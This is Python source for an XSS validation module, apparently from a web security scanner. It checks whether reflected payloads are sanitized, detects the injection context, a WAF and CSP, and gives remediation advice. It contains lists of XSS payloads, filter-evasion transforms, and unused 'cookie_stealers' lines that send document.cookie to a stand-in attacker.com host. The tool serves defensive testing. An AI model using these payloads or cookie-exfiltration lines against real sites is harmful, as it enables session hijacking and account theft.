"""
XSS Validator - validates Cross-Site Scripting findings.

Provides multiple validation layers:
1. Static analysis: Was the payload reflected without sanitization?
2. CSP analysis: Does CSP block the injection context?
3. HTML parsing: Is the payload in an executable DOM position?
4. Browserless validation: Heuristic assessment of exploitability
"""

import re
import html
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import unquote, quote

# Playwright browser validation is intentionally disabled in this deployment.
# The validator gracefully degrades to static/heuristic assessment.
HAS_PLAYWRIGHT = False
BrowserValidator = None


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

@dataclass
class ValidationEvidence:
    """Evidence collected during XSS validation."""
    payload: str
    reflected: bool = False
    reflection_context: str = ""  # html, attribute, script, js_string, etc.
    reflection_quote: str = ""  # single, double, backtick, none
    sanitized: bool = True
    html_encoded: bool = False
    url_encoded: bool = False
    truncated: bool = False
    filtered_chars: List[str] = field(default_factory=list)
    csp_blocks: bool = False
    csp_details: Dict = field(default_factory=dict)
    waf_blocked: bool = False
    waf_type: str = ""
    dom_position: str = ""  # text node, attribute value, event handler, etc.
    dom_executable: bool = False
    dom_parent_tag: str = ""
    dom_parent_id: str = ""
    dom_siblings: List[str] = field(default_factory=list)


@dataclass
class ValidationResult:
    """Final validation decision for an XSS finding."""
    is_valid: bool
    confidence: float  # 0.0 - 1.0
    severity: str  # high, medium, low, info
    evidence: ValidationEvidence
    reason: str = ""
    poc_payload: str = ""
    alternative_payloads: List[str] = field(default_factory=list)
    remediation: str = ""
    cvss_vector: str = ""
    cwe_id: str = "CWE-79"


# ---------------------------------------------------------------------------
# XSS Validator
# ---------------------------------------------------------------------------

class XSSValidator:
    """Multi-layered XSS validation system."""

    def __init__(self, browser_validator=None):
        """Initialize validator.

        browser_validator is accepted but ignored in this deployment;
        browser-based validation is disabled via graceful degradation.
        """
        self.browser_validator = None

    # ── Main Validation API ────────────────────────────────────────────

    def validate(
        self,
        payload: str,
        response_body: str,
        response_headers: Dict[str, str],
        target_url: str = "",
        param_name: str = "",
        param_value: str = "",
    ) -> ValidationResult:
        """Full validation pipeline for a single XSS payload."""
        evidence = self._collect_evidence(
            payload, response_body, response_headers, target_url,
            param_name, param_value,
        )

        # Decision logic
        is_valid, confidence, reason = self._decide(evidence)

        severity = "high"
        if confidence < 0.5:
            severity = "low"
        elif confidence < 0.7:
            severity = "medium"

        # Generate POC
        poc = ""
        if is_valid:
            poc = self._generate_poc(payload, evidence)

        # Alternatives
        alternatives = []
        if confidence >= 0.5:
            alternatives = self._generate_alternatives(payload, evidence)

        # Remediation guidance
        remediation = self._build_remediation(evidence)

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            severity=severity,
            evidence=evidence,
            reason=reason,
            poc_payload=poc,
            alternative_payloads=alternatives,
            remediation=remediation,
            cwe_id="CWE-79",
        )

    def batch_validate(
        self,
        findings: List[Dict],
        response_body: str,
        response_headers: Dict[str, str],
        target_url: str = "",
    ) -> List[ValidationResult]:
        """Validate multiple XSS findings against a single response."""
        results = []
        for finding in findings:
            payload = finding.get("payload", finding.get("value", ""))
            param = finding.get("parameter", finding.get("param", ""))
            result = self.validate(
                payload, response_body, response_headers,
                target_url, param,
            )
            results.append(result)
        return results

    # ── Evidence Collection ────────────────────────────────────────────

    def _collect_evidence(
        self,
        payload: str,
        body: str,
        headers: Dict[str, str],
        target_url: str,
        param_name: str,
        param_value: str,
    ) -> ValidationEvidence:
        """Gather all evidence about how the payload was handled."""
        evidence = ValidationEvidence(payload=payload)

        # Check reflection
        evidence.reflected = payload in body

        if not evidence.reflected:
            # Check for partial reflection
            for partial in self._get_partial_reflections(payload):
                if partial in body:
                    evidence.reflected = True
                    evidence.filtered_chars = self._diff_chars(payload, partial)
                    break

        if not evidence.reflected:
            return evidence

        # HTML encoding check
        html_encoded_payload = html.escape(payload)
        if payload != html_encoded_payload and html_encoded_payload in body:
            evidence.html_encoded = True
            evidence.sanitized = True

        # URL encoding check
        url_encoded_payload = quote(payload, safe="")
        if url_encoded_payload in body and payload not in body:
            evidence.url_encoded = True

        # Detect context
        ctx = self._detect_reflection_context(body, payload)
        evidence.reflection_context = ctx["context"]
        evidence.reflection_quote = ctx["quote"]
        evidence.dom_position = ctx["dom_position"]
        evidence.dom_parent_tag = ctx["parent_tag"]
        evidence.dom_parent_id = ctx["parent_id"]

        # Check if payload is in executable DOM position
        evidence.dom_executable = self._is_executable_position(ctx)

        # Check for truncation
        if len(payload) > 10 and payload not in body:
            # Check if truncated version exists
            for length in range(5, len(payload)):
                truncated = payload[:length]
                if truncated in body and payload[:length + 1] not in body:
                    evidence.truncated = True
                    break

        # Check for WAF signs
        waf_info = self._detect_waf(headers, body)
        evidence.waf_blocked = waf_info["detected"]
        evidence.waf_type = waf_info["type"]

        # CSP analysis
        evidence.csp_details = self._parse_csp(headers, body)
        evidence.csp_blocks = self._csp_blocks(ctx, evidence.csp_details)

        # Detect filtered characters
        evidence.filtered_chars = self._detect_filtered_chars(payload, body)

        return evidence

    @staticmethod
    def _get_partial_reflections(payload: str) -> List[str]:
        """Generate partial payload slices to detect truncation/filtering."""
        parts = []
        clean = payload.strip("<>\"'`/\\")

        # Key dangerous snippets to check for
        xss_keywords = [
            "alert", "prompt", "confirm", "onerror", "onload",
            "<script", "</script", "javascript:",
            "<img", "<svg", "<body", "<iframe",
            "onmouseover", "onfocus", "onclick",
        ]

        for keyword in xss_keywords:
            if keyword in payload.lower():
                parts.append(keyword)

        parts.append(clean[:10])  # First 10 chars
        return parts

    @staticmethod
    def _diff_chars(original: str, reflected: str) -> List[str]:
        """Find characters that were filtered out."""
        filtered = []
        for ch in set(original):
            if ch not in reflected:
                filtered.append(ch)
        return sorted(filtered)

    # ── Context Detection ──────────────────────────────────────────────

    @staticmethod
    def _detect_reflection_context(body: str, payload: str) -> Dict:
        """Determine DOM context of reflected payload."""
        ctx = {
            "context": "unknown",
            "quote": "",
            "dom_position": "unknown",
            "parent_tag": "",
            "parent_id": "",
        }

        if payload not in body:
            return ctx

        # Find payload position
        idx = body.index(payload)
        # Get surrounding context
        start = max(0, idx - 200)
        end = min(len(body), idx + len(payload) + 200)
        surrounding = body[start:end]

        # Detect context by surrounding HTML structure
        # Script block
        script_match = re.search(
            r'<\s*script\b[^>]*>(.*?)' + re.escape(payload) + r'(.*?)<\s*/\s*script\s*>',
            surrounding, re.DOTALL | re.IGNORECASE,
        )
        if script_match:
            before = script_match.group(1)
            ctx["context"] = "script_block"
            ctx["dom_position"] = "script_text"
            ctx["parent_tag"] = "script"
            # Check if in JS string
            for q in ('"', "'", "`"):
                if q in before:
                    # Check if quote is open
                    before_idx = before.rfind(q)
                    after_q = body[idx + len(payload):idx + len(payload) + 500]
                    after_idx = after_q.find(q)
                    if after_idx >= 0:
                        ctx["context"] = "js_string"
                        ctx["quote"] = q
                        ctx["dom_position"] = "js_string_value"
                        break
            return ctx

        # Style block
        style_match = re.search(
            r'<\s*style\b[^>]*>(.*?)' + re.escape(payload) + r'(.*?)<\s*/\s*style\s*>',
            surrounding, re.DOTALL | re.IGNORECASE,
        )
        if style_match:
            ctx["context"] = "css"
            ctx["dom_position"] = "style_text"
            ctx["parent_tag"] = "style"
            return ctx

        # HTML comment
        comment_match = re.search(
            r'<!--(.*?)' + re.escape(payload) + r'(.*?)-->',
            surrounding, re.DOTALL,
        )
        if comment_match:
            ctx["context"] = "comment"
            ctx["dom_position"] = "comment_text"
            return ctx

        # Event handler
        event_re = re.compile(
            r"""<\s*\w+\s[^>]*?\bon[a-zA-Z]+\s*=\s*(["']?)(.*?)""" +
            re.escape(payload) + r"""(.*?)\1""",
            re.DOTALL | re.IGNORECASE,
        )
        event_match = event_re.search(surrounding)
        if event_match:
            ctx["context"] = "event_handler"
            ctx["quote"] = event_match.group(1) or ""
            ctx["dom_position"] = "event_handler_value"
            # Extract parent tag
            parent = re.search(r'<\s*(\w+)\s', surrounding[:idx - start])
            if parent:
                ctx["parent_tag"] = parent.group(1)
            return ctx

        # Attribute value
        attr_re = re.compile(
            r"""(\w[\w-]*)\s*=\s*(["'])(.*?)""" +
            re.escape(payload) + r"""(.*?)\2""",
            re.DOTALL,
        )
        attr_match = attr_re.search(surrounding)
        if attr_match:
            ctx["context"] = "attribute"
            ctx["quote"] = attr_match.group(2) or ""
            attr_name = attr_match.group(1)
            ctx["dom_position"] = f"attribute_{attr_name}_value"
            # Extract parent tag
            parent = re.search(
                r'<\s*(\w+)[^>]*?' + re.escape(attr_name),
                surrounding[:attr_match.start()],
            )
            if parent:
                ctx["parent_tag"] = parent.group(1)
            return ctx

        # Text node (between tags)
        text_match = re.search(
            r'>(.*?)' + re.escape(payload) + r'(.*?)<',
            surrounding, re.DOTALL,
        )
        if text_match:
            ctx["context"] = "html_text"
            ctx["dom_position"] = "text_node"
            # Find parent tag
            parent = re.search(r'<(\w+)[^>]*>', surrounding[:idx - start - len(payload)])
            if parent:
                ctx["parent_tag"] = parent.group(1)
            return ctx

        ctx["context"] = "html_text"
        ctx["dom_position"] = "text_node"
        return ctx

    @staticmethod
    def _is_executable_position(ctx: Dict) -> bool:
        """Determine if the DOM position can execute XSS."""
        context = ctx.get("context", "")
        dom_pos = ctx.get("dom_position", "")

        executable_contexts = {
            "html_text": True,
            "script_block": True,
            "js_string": True,
            "event_handler": True,
            "attribute": True,
        }

        if context in executable_contexts:
            return True

        if "attribute" in dom_pos:
            return True

        return False

    # ── WAF Detection ──────────────────────────────────────────────────

    @staticmethod
    def _detect_waf(headers: Dict[str, str], body: str) -> Dict:
        """Detect WAF presence and type from headers and body."""
        result = {"detected": False, "type": ""}

        waf_headers = {
            "Server": {
                "cloudflare": "Cloudflare",
                "akamai": "Akamai",
                "imperva": "Imperva",
                "f5": "F5 BIG-IP",
                "barracuda": "Barracuda",
                "fortiweb": "Fortinet FortiWeb",
                "sucuri": "Sucuri",
                "aws": "AWS WAF",
            },
            "X-CDN": {
                "cloudflare": "Cloudflare",
                "fastly": "Fastly",
                "akamai": "Akamai",
            },
            "X-Sucuri-ID": {"": "Sucuri"},
        }

        for header_name, signatures in waf_headers.items():
            header_val = headers.get(header_name, "").lower()
            for sig, waf_name in signatures.items():
                if sig in header_val:
                    result["detected"] = True
                    result["type"] = waf_name
                    return result

        # Additional WAF header checks
        additional_headers = [
            ("X-CDN", "Cloudflare"),
            ("CF-Ray", "Cloudflare"),
            ("X-Amzn-RequestId", "AWS"),  # CloudFront
            ("X-Request-Id", "AWS"),  # ALB
        ]
        for hdr_name, waf_name in additional_headers:
            if hdr_name in headers:
                result["detected"] = True
                result["type"] = waf_name
                return result

        # Check body for WAF signs
        body_lower = body.lower()
        waf_body_patterns = [
            ("cloudflare", "Cloudflare"),
            ("incapsula", "Imperva"),
            ("_-incapsula_", "Imperva"),
            ("blocked by waf", "Generic WAF"),
            ("access denied by", "Generic WAF"),
            ("request rejected", "Generic WAF"),
            ("attack detected", "Generic WAF"),
            ("web application firewall", "Generic WAF"),
            ("your request has been blocked", "Generic WAF"),
            ("mod_security", "ModSecurity"),
            ("modsecurity", "ModSecurity"),
            ("naxsi", "NAXSI"),
            ("this is a security measure", "Generic WAF"),
            ("captcha-bypass", "Generic WAF"),
            ("ddos-guard", "DDoS-Guard"),
        ]
        for pattern, waf_name in waf_body_patterns:
            if pattern in body_lower:
                result["detected"] = True
                result["type"] = waf_name
                return result

        return result

    # ── CSP Analysis ───────────────────────────────────────────────────

    @staticmethod
    def _parse_csp(headers: Dict[str, str], body: str) -> Dict:
        """Parse Content-Security-Policy from headers or meta tag."""
        csp = {"exists": False, "directives": {}, "script_allows_inline": False,
               "script_allows_eval": False, "uses_nonce": False, "report_only": False,
               "has_default_src": False, "loose_policy": False}

        # Priority: CSP header (not report-only), CRO header, meta tag
        csp_string = ""
        for hdr in ("Content-Security-Policy", "Content-Security-Policy-Report-Only"):
            val = headers.get(hdr, "")
            if val:
                csp_string = val
                if "Report-Only" in hdr:
                    csp["report_only"] = True
                break

        if not csp_string:
            # Check meta tag in body
            csp_meta = re.search(
                r'<meta\s+http-equiv=["\']Content-Security-Policy["\']\s+content=["\']([^"\']+)["\']',
                body, re.IGNORECASE,
            )
            if csp_meta:
                csp_string = csp_meta.group(1)
            else:
                return csp

        csp["exists"] = True

        # Parse directives
        for directive in csp_string.split(";"):
            d = directive.strip()
            if not d:
                continue
            parts = d.split()
            name = parts[0].lower()
            values = parts[1:]
            csp["directives"][name] = values

        # Analyze script-src / default-src
        script_src = csp["directives"].get(
            "script-src", csp["directives"].get("default-src", [])
        )
        if script_src:
            csp["script_allows_inline"] = "unsafe-inline" in script_src
            csp["script_allows_eval"] = "unsafe-eval" in script_src
            csp["uses_nonce"] = any(v.startswith("nonce-") for v in script_src if isinstance(v, str))
            csp["has_default_src"] = "default-src" in csp["directives"]
            # Loose policy: allows inline OR has no nonce/hash
            csp["loose_policy"] = csp["script_allows_inline"] or (
                not csp["uses_nonce"] and not any(v.startswith("sha") for v in script_src if isinstance(v, str))
            )

        return csp

    @staticmethod
    def _csp_blocks(context: Dict, csp: Dict) -> bool:
        """Check if CSP would block the XSS in this context."""
        if not csp.get("exists"):
            return False

        if csp.get("report_only"):
            return False  # Report-only doesn't block

        if csp.get("loose_policy"):
            return False

        context_type = context.get("context", "")

        # Inline script in script block
        if context_type in ("script_block", "js_string"):
            script_src = csp.get("directives", {}).get(
                "script-src", csp.get("directives", {}).get("default-src", [])
            )
            if script_src and not csp.get("script_allows_inline"):
                return True

        # Inline event handler
        if context_type == "event_handler":
            return True  # CSP blocks inline event handlers by default

        return False

    # ── Filtered Character Detection ───────────────────────────────────

    @staticmethod
    def _detect_filtered_chars(payload: str, body: str) -> List[str]:
        """Detect which characters were filtered from the payload."""
        filtered = []

        # Special characters to check
        special_chars = ['<', '>', '"', "'", '`', '/', '\\', '(', ')', ';', ':', '!', '-', '+', '=']

        for ch in special_chars:
            if ch in payload:
                # Check if character appears in context around the reflection
                if payload in body:
                    idx = body.index(payload)
                    context_start = max(0, idx - 50)
                    context_end = min(len(body), idx + len(payload) + 50)
                    context = body[context_start:context_end]
                    # Check if this specific char is in the context
                    if ch not in context[idx - context_start:idx - context_start + len(payload)]:
                        filtered.append(ch)

        return filtered

    # ── Decision Logic ─────────────────────────────────────────────────

    @staticmethod
    def _decide(evidence: ValidationEvidence) -> Tuple[bool, float, str]:
        """Decide if XSS is valid and assign confidence."""
        if not evidence.reflected:
            return False, 0.0, "Payload not reflected in response."

        if evidence.html_encoded:
            return False, 0.1, "Payload is HTML-encoded — not executable."

        if evidence.csp_blocks:
            return False, 0.2, "CSP blocks the injection context — no execution possible."

        if evidence.waf_blocked:
            return True, 0.5, (
                f"WAF detected ({evidence.waf_type}) but payload reflected. "
                "Low confidence — WAF may block execution in other contexts."
            )

        if not evidence.dom_executable:
            return False, 0.2, "Payload reflected in non-executable DOM position."

        # Context-based confidence scoring
        confidence_map = {
            "script_block": 0.9,
            "js_string": 0.8,
            "event_handler": 0.95,
            "html_text": 0.85,
            "attribute": 0.75,
            "css": 0.3,
            "comment": 0.1,
            "unknown": 0.4,
        }

        base_confidence = confidence_map.get(
            evidence.reflection_context, 0.4
        )

        # Penalties
        if evidence.truncated:
            base_confidence -= 0.2
        if evidence.url_encoded:
            base_confidence -= 0.1
        if len(evidence.filtered_chars) > 2:
            base_confidence -= 0.2

        # Minimum threshold
        if base_confidence < 0.3:
            return False, base_confidence, (
                f"Low execution confidence ({evidence.reflection_context} context)"
            )

        reason = (
            f"Payload reflected in {evidence.reflection_context} context "
            f"(confidence: {base_confidence:.2f})"
        )
        if evidence.filtered_chars:
            reason += f". Filtered chars: {''.join(evidence.filtered_chars)}"

        return base_confidence >= 0.3, min(base_confidence, 1.0), reason

    # ── POC Generation ─────────────────────────────────────────────────

    def _generate_poc(self, payload: str, evidence: ValidationEvidence) -> str:
        """Generate a minimal Proof-of-Concept payload."""
        ctx = evidence.reflection_context
        quote = evidence.reflection_quote

        # Minimal alert-based POC
        poc_map = {
            "html_text": "<img src=x onerror=alert(document.domain)>",
            "script_block": ";alert(document.domain);",
            "js_string": f";alert(document.domain);//",
            "event_handler": "alert(document.domain)",
            "attribute": "<script>alert(document.domain)</script>",
        }

        base = poc_map.get(ctx, payload)

        # Adjust for quote context
        if quote == "'":
            base = base.replace('"', "'") if payload == base else base
        elif quote == '"':
            base = base.replace("'", '"') if payload == base else base

        return base

    # ── Alternative Payloads ───────────────────────────────────────────

    def _generate_alternatives(
        self, payload: str, evidence: ValidationEvidence,
    ) -> List[str]:
        """Generate alternative payloads for bypass scenarios."""
        ctx = evidence.reflection_context
        alternatives = []

        short_alerts = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<body onload=alert(1)>",
            "<select autofocus onfocus=alert(1)>X</select>",
            "<marquee onstart=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ]

        cookie_stealers = [
            "fetch('https://attacker.com/?c='+document.cookie)",
            "new Image().src='https://attacker.com/?c='+document.cookie",
            "document.location='https://attacker.com/?c='+document.cookie",
        ]

        evasions = [
            f"<{payload}>" if payload.startswith("<") else payload,
            payload.replace("<", "%3C").replace(">", "%3E"),
            payload.upper(),
            "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
        ]

        alternatives.extend(short_alerts[:3])
        alternatives.extend(evasions[:2])

        return sorted(set(alternatives))[:5]

    # ── Remediation Guidance ───────────────────────────────────────────

    @staticmethod
    def _build_remediation(evidence: ValidationEvidence) -> str:
        """Build context-specific remediation advice."""
        ctx = evidence.reflection_context
        remediation_map = {
            "html_text": "Use context-aware output encoding (HTML entity encoding) before writing to HTML body.",
            "attribute": "Attribute-encode output: replace < > \" ' & with HTML entities.",
            "js_string": "JS-string-encode output (escape quotes, backslashes, newlines). Prefer JSON.stringify.",
            "script_block": "Never inject user-controlled data into <script> blocks. Use textContent for DOM manipulation.",
            "event_handler": "Move event logic to separate JS files. If inline required, validate input against whitelist.",
            "css": "Use CSS.escape() for dynamic CSS values. Avoid user-controlled style content.",
            "comment": "Strip all user input from HTML comments or don't render comments from user data.",
        }
        base = remediation_map.get(
            ctx, "Apply context-appropriate output encoding."
        )

        additional = []
        if evidence.html_encoded:
            additional.append("Current HTML encoding is effective — maintain it.")
        if evidence.csp_blocks:
            additional.append("CSP is properly configured and blocking this vector.")
        if not evidence.csp_details.get("exists"):
            additional.append("Implement Content-Security-Policy for defense-in-depth.")
        if evidence.waf_type:
            additional.append(f"WAF ({evidence.waf_type}) detected — verify rules cover this vector.")

        if additional:
            base += " " + " ".join(additional)

        return base